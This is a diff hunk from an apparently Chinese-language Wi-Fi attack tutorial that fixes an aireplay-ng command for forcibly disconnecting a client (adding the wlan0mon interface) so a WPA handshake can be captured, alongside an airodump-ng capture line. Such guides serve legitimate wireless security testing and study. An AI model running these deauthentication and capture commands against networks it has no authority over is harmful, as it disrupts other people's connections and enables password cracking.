@@ -44,7 +44,7 @@ airodump-ng --bssid BSSID地址 -c 信道 -w 文件保存位置 wlan0mon
 ## 断开一个客户端连接
 
 ```sh
-aireplay-ng -0 次数 -a BSSID地址 -c 客户端地址
+aireplay-ng -0 次数 -a BSSID地址 -c 客户端地址 wlan0mon
 ```
 
 使用如上命令辅助握手包抓取
